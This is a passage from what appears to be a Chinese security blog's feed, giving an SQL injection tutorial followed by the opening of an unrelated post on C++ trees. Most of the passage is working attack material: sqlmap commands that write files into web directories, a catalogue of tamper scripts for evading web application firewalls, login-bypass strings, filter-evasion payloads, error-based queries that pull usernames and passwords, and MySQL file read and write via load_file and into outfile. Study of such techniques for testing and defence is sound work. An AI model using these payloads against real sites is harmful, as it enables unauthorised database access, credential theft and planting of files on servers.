<p>数据库：MySQL、PostgreSQL、Microsoft SQL Server<br>且：当前用户有权限使用特定的函数时。可以上传文本文件或二进制文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=本地文件路径 --file-dest 网站路径(写入路径)+&quot;/写入的文件名&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx</span></span><br></pre></td></tr></table></figure>

<h3 id="17-3-–tamper"><a href="#17-3-–tamper" class="headerlink" title="17.3 –tamper"></a>17.3 –tamper</h3><p>sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。</p>
<p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p>
<p>绕过脚本目录在 <code>sqlmap/tamper</code>，目前官方提供 53 个绕过脚本</p>
<p><img src="https://i.loli.net/2021/09/14/yh6FDGfeZTlOcqn.png" alt="image-20210914203704034"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url] <span class="comment">--tamper [模块名]</span></span><br></pre></td></tr></table></figure>

<p>可以使用–identify-waf对一些网站是否有安全防护进行试探</p>
<p>0x02 常用tamper脚本<br>apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
<p>base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p>
<p>multiplespaces.py<br>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p>
<p>space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
<p>nonrecursivereplacement.py<br>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
<p>space2randomblank.py<br>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
<p>unionalltounion.py<br>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION SELECT</p>
<p>securesphere.py<br>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p>
<p>space2dash.py<br>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p>
<p>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p>
<p>between.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p>
<p>percentage.py<br>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
<p>sp_password.py<br>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br>使用脚本后：1 AND 9227=9227– sp_password</p>
<p>charencode.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
<p>randomcase.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p>
<p>charunicodeencode.py<br>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
<p>space2comment.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为/<strong>/<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p>
<p>equaltolike.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将=替换为LIKE<br>使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>
<p>equaltolike.py<br>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)=A</p>
<p>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p>
<p>modsecurityversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p>
<p>space2mysqlblank.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
<p>modsecurityzeroversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p>
<p>space2mysqldash.py<br>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–%0AAND–%0A9227=9227</p>
<p>bluecoat.py<br>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
<p>versionedkeywords.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
<p>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>使用脚本后：value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p>
<p>space2morehash.py<br>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
<p>apostrophenullencode.py<br>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %00%271%00%27=%00%271</p>
<p>appendnullbyte.py<br>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1%00</p>
<p>chardoubleencode.py<br>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
<p>unmagicquotes.py<br>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1=1”)<br>使用脚本后：1%bf%27 AND 1=1–</p>
<p>randomcomments.py<br>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I/<strong>/N/</strong>/SERT</p>
<p>在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。</p>
<h2 id="十八、绕过姿势-str-replace"><a href="#十八、绕过姿势-str-replace" class="headerlink" title="十八、绕过姿势   str_replace()"></a>十八、绕过姿势   <code>str_replace()</code></h2><p><strong>任何的表名、数据库名都可以使用十六进制代替</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=-1%df<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+</span></span><br></pre></td></tr></table></figure>

<p><strong>万能密码</strong>：<code>$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不知用户名时</span></span><br><span class="line"><span class="string">&#x27; or 1--+			# 注释闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1			# 手动闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">#		# 使用了注释#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道一个用户名</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可尝试</span></span><br><span class="line">1<span class="string">&#x27;or(1)#</span></span><br></pre></td></tr></table></figure>

<p><strong>过滤 注释</strong>：</p>
<p>法一：截断 <code>;%00</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;%00</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br></pre></td></tr></table></figure>

<p>法二：手动闭合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>

<p><strong>过滤空格</strong>：</p>
<p>括号包围：对于一些字段名可使用括号包围</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;)),0x7e),1);%0</span></span><br></pre></td></tr></table></figure>

<p>字符编码绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以绕过空格的编码：</span></span><br><span class="line">%09  Tab键-水平</span><br><span class="line">%0a  换行</span><br><span class="line">%0c  换页</span><br><span class="line">%0b  Tab键-垂直</span><br><span class="line">%0d</span><br><span class="line">%00</span><br><span class="line">%a0  在特定字符集才可使用</span><br><span class="line"><span class="comment"># 特殊的 </span></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>

<p><strong>大小写绕过：</strong></p>
<p>Mysql 中，关键字是不区分大小写的，如果仅仅是过滤了 <code>select </code> ，那么我们可以使用 <code>SelECt</code> ，进行大小写混写绕过。</p>
<p><strong>正则匹配：</strong></p>
<p>正则如果匹配 <code>\bselect\b</code>  ，我们可以使用 <code>/*!50000select*/</code> 绕过。</p>
<p><img src="https://i.loli.net/2021/08/20/8BtLSruRD7nsIdp.png" alt="image-20210820224913933"></p>
<p><strong>一次过滤：双写绕过</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/select/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p><strong>and  or  过滤：双写绕过，或者是 &amp;&amp;–&gt;%26%26  ||–&gt;%7c%7c</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>||updatexml(1,concat(0x7e,database(),0x7e),1)||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<p><strong>过滤了单双引号，但没有过滤 反斜杠  <code>\</code></strong></p>
<p>例如：sql 语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from nres where id=&#x27;可控参数1&#x27; and title=&#x27;可控参数2&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>我们可以进行如下构造，不使用 单双引号，利用反斜杠</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=a\</span><br><span class="line">title=or sleep(3)<span class="comment">#</span></span><br><span class="line"><span class="comment">#这样拼起来的 sql 语句就是</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from nres where id=&#x27;a\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;</span>;</span><br><span class="line"><span class="comment"># 如此，or sleep(3)# 便成了一个整体，将会成功执行后面的 sleep(3)</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27; or sleep(2)#&#x27;</span></span><br><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/20/jmOk2eyG7lXcwSd.png" alt="image-20210820230717823"></p>
<p><strong>引号逃逸：其实就是由于做了转义</strong></p>
<p>对单引号、双引号等进行转义之后，在一定程度上妨碍了我们的注入，当遇到这种情况，我们可以考虑：宽字节注入、二次注入、HTTP 头部注入</p>
<p><strong>字符串截断：</strong></p>
<p>在一些标题等位置，开发者一般会限制标题的字符长度，如果超过，有可能会被截断。</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">	<span class="variable">$title</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$title</span>;</span><br><span class="line">	<span class="variable">$title</span> = substr(<span class="variable">$title</span>,<span class="number">0</span>,<span class="number">10</span>);	<span class="comment">#做了截断处理</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$title</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;insert into users values(15, &#x27;<span class="subst">$title</span>&#x27; , &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line">	<span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果攻击者想进行 sql 注入测试，可以选择输入 <code>aaaaaaaaa&#39;</code> ，则经过转义之后，将会变为 <code>aaaaaaaaa\&#39;</code> ，但是由于后面的截断，将变成 <code>aaaaaaaaa\</code>。</p>
<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?title=aaaaaaaaa\<span class="string">&#x27;&amp;content=,1),(16,321,2)--+</span></span><br></pre></td></tr></table></figure>

<p>这样拼接到 sql 语句中就变成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insert into news values(15, <span class="string">&#x27;aaaaaaaaa\&#x27;</span> , <span class="string">&#x27;,1),(16,321,2)--+&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这样 由于转义使得 <code>aaaaaaaaa\&#39; , </code> 成为了由单引号包围的一部分，也就成功执行了 插入语句。</p>
<p><img src="https://i.loli.net/2021/08/21/H68oDiqE1fGIw3S.png" alt="image-20210821105719366"></p>
<p><strong>过滤等号 <code>=</code></strong></p>
<p>使用 <code>like</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="十九、其它"><a href="#十九、其它" class="headerlink" title="十九、其它"></a>十九、其它</h2><ol>
<li><p>在以上的任何一个注入方式中，都有可能对用户所输入的内容进行编码，例如进行 <code>base64</code> 编码，我们进行爆破时要记得编码；</p>
</li>
<li><p>Nosql 注入         <a href="https://www.cnblogs.com/bonelee/p/12158385.html">https://www.cnblogs.com/bonelee/p/12158385.html</a></p>
</li>
<li></li>
</ol>
<h2 id="二十、解决查内容时一次显示不全"><a href="#二十、解决查内容时一次显示不全" class="headerlink" title="二十、解决查内容时一次显示不全"></a>二十、解决查内容时一次显示不全</h2><p><strong>方法一：一条一条查</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">and updatexml(1,concat(0x5e,(select concat(username,<span class="string">&#x27;~&#x27;</span>,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：substr(,,)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 每次查30个字符</span></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),1,30) from security.users),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),31,30) from security.users),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h1 id="总结：regexp-正则匹配速查表"><a href="#总结：regexp-正则匹配速查表" class="headerlink" title="总结：regexp 正则匹配速查表"></a>总结：regexp 正则匹配速查表</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">&lt;内容&gt; regexp <span class="string">&#x27;正则表达式&#x27;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">说明</th>
<th align="left">例子</th>
<th align="left">匹配值示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">^</td>
<td align="left">匹配文本的开始字符</td>
<td align="left">‘^b’ 匹配以字母 b 开头的字符串</td>
<td align="left">book、big、banana、bike</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配文本的结束字符</td>
<td align="left">‘st$’ 匹配以 st 结尾的字符串</td>
<td align="left">test、resist、persist</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配任何单个字符</td>
<td align="left">‘b.t’ 匹配任何 b 和 t 之间有一个字符</td>
<td align="left">bit、bat、but、bite</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配零个或多个在它前面的字符</td>
<td align="left">‘f*n’ 匹配字符 n 前面有任意个字符 f</td>
<td align="left">fn、fan、faan、abcn</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的字符 1 次或多次</td>
<td align="left">‘ba+’ 匹配以 b 开头，后面至少紧跟一个 a</td>
<td align="left">ba、bay、bare、battle</td>
</tr>
<tr>
<td align="left">&lt;字符串&gt;</td>
<td align="left">匹配包含指定字符的文本</td>
<td align="left">‘fa’ 匹配包含‘fa’的文本</td>
<td align="left">fan、afa、faad</td>
</tr>
<tr>
<td align="left">[字符集合]</td>
<td align="left">匹配字符集合中的任何一个字符</td>
<td align="left">‘[xz]’ 匹配 x 或者 z</td>
<td align="left">dizzy、zebra、x-ray、extra</td>
</tr>
<tr>
<td align="left">[^ ]</td>
<td align="left">匹配不在括号中的任何字符</td>
<td align="left">‘[^abc]’ 匹配任何不包含 a、b 或 c 的字符串</td>
<td align="left">desk、fox、f8ke</td>
</tr>
<tr>
<td align="left">字符串{n,}</td>
<td align="left">匹配前面的字符串至少 n 次</td>
<td align="left">‘b{2}’ 匹配 2 个或更多的 b</td>
<td align="left">bbb、bbbb、bbbbbbb</td>
</tr>
<tr>
<td align="left">字符串 {n,m}</td>
<td align="left">匹配前面的字符串至少 n 次， 至多 m 次</td>
<td align="left">‘b{2,4}’ 匹配最少 2 个，最多 4 个 b</td>
<td align="left">bbb、bbbb</td>
</tr>
</tbody></table>
<p><strong>匹配中文时</strong>：<code>regexp &#39;(文字)&#39;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">regexp <span class="string">&#x27;[文字]&#x27;</span> 		<span class="comment">#报错</span></span><br><span class="line">regexp <span class="string">&#x27;文字&#x27;</span></span><br><span class="line">like <span class="string">&#x27;文字&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Mysql-对文件的操作"><a href="#Mysql-对文件的操作" class="headerlink" title="Mysql 对文件的操作"></a>Mysql 对文件的操作</h1><ul>
<li>load_file()</li>
<li>load data infile()</li>
<li>system cat</li>
</ul>
<p><strong>使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL</strong></p>
<p>注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#查看 File_priv</span><br><span class="line"><span class="keyword">select</span> File_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host <span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/01/DcqRGnP48OB7kW9.png" alt="image-20210601180220996"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#查看 secure_file_priv</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line">值是 <span class="keyword">NULL</span> <span class="comment">--- 不允许文件导入导出操作</span></span><br><span class="line">值是 空   <span class="comment">--- 不对mysql的导入导出操作做出限制</span></span><br><span class="line">值是 具体路径 限制mysql的导入与导出操作限制在指定路径下</span><br><span class="line">#修改</span><br><span class="line"># Windows 下</span><br><span class="line">修改 mysql.ini 文件 （secure_file_priv <span class="operator">=</span>）</span><br><span class="line"># Linux 下</span><br><span class="line">在<span class="operator">/</span>etc<span class="operator">/</span>my.cnf的[mysqld]下面添加<span class="keyword">local</span><span class="operator">-</span>infile<span class="operator">=</span><span class="number">0</span>选项</span><br></pre></td></tr></table></figure>

<p><strong>读取文件</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># load_file()</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;D:/test.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># load data infile()</span><br><span class="line"># 利用该函数读文件时需要将文件内容保存至一个表中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(content text);</span><br><span class="line">load data infile <span class="string">&#x27;D:\\test.txt&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;	</span><br></pre></td></tr></table></figure>

<p><strong>写入文件</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\users.txt&#x27;</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB漏洞详解</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>六、树</title>
    <url>/2025/12/03/%E5%85%AD%E3%80%81%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="六、树——递归"><a href="#六、树——递归" class="headerlink" title="六、树——递归"></a>六、树——递归</h2><p>C++中 <strong>底层实现</strong>：</p>
<p>【<strong>平衡二叉搜索树</strong>】：map、set、multimap，map、set</p>
<ul>
<li>时间复杂度：O(log n)</li>
</ul>
